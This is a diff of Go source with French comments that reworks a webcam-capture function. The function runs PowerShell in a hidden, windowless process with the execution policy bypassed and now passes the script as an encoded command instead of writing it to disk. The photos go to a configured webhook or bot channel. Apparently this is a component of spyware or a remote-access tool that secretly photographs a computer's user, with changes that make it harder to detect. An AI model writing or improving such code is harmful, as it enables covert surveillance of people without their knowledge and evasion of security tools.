@@ -21,7 +21,6 @@ import (
 	"os/exec"
 	"strings"
 	"syscall"
-	"time"
 )
 
 // webcamScript est le script exécuté, écrit sur disque à chaque capture.
@@ -116,32 +115,32 @@ try {
 }
 `
 
-// webcamCapture écrit le script, l'exécute en fenêtre masquée et renvoie le
-// chemin de la photo. Erreur explicite si aucune image n'a été produite.
-func webcamCapture() (string, error) {
-	script := workPath("wmc.ps1")
-	if err := os.WriteFile(script, []byte(webcamScript), 0600); err != nil {
-		return "", fmt.Errorf("script: %s", err)
-	}
-	out := workPath(fmt.Sprintf("cam-%s.jpg", time.Now().Format("060102-150405")))
-	_ = os.Remove(out)
+// webcamCaptureTo capture une photo et l'écrit directement à path.
+// Erreur explicite si aucune image n'a été produite.
+func webcamCaptureTo(path string) error {
+	_ = os.Remove(path)
+
+	// Le paramètre $Out reçoit le chemin par injection dans le corps encodé
+	// (param doit rester la première instruction du script).
+	body := strings.Replace(webcamScript, "param([string]$Out)",
+		"param([string]$Out)\r\n$Out = '"+strings.ReplaceAll(path, "'", "''")+"'", 1)
 
 	cmd := exec.Command("powershell.exe",
 		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
-		"-ExecutionPolicy", "Bypass", "-File", script, "-Out", out)
+		"-EncodedCommand", psEncoded(body))
 	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000} // CREATE_NO_WINDOW
 	var buf bytes.Buffer
 	cmd.Stdout = &buf
 	cmd.Stderr = &buf
 	if err := cmd.Run(); err != nil {
 		msg := truncate(strings.TrimSpace(buf.String()), 200)
-		return "", fmt.Errorf("%s (%s)", err, msg)
+		return fmt.Errorf("%s (%s)", err, msg)
 	}
-	st, err := os.Stat(out)
+	st, err := os.Stat(path)
 	if err != nil || st.Size() < 1024 {
-		return "", fmt.Errorf("aucune image : %s", truncate(strings.TrimSpace(buf.String()), 200))
+		return fmt.Errorf("aucune image : %s", truncate(strings.TrimSpace(buf.String()), 200))
 	}
-	return out, nil
+	return nil
 }
 
 // webcamFlush prend une photo et la pousse dans le salon webcam (tâche
@@ -157,7 +156,9 @@ func webcamNow() error {
 	if stopped.Load() || (cfg.WebhookURL == "" && cfg.BotToken == "") {
 		return fmt.Errorf("transport non configuré")
 	}
-	path, err := webcamCapture()
+	tmp := workPath("cam-now.jpg")
+	err := webcamCaptureTo(tmp)
+	path := tmp
 	if err != nil {
 		plog("webcam: " + err.Error())
 		return err
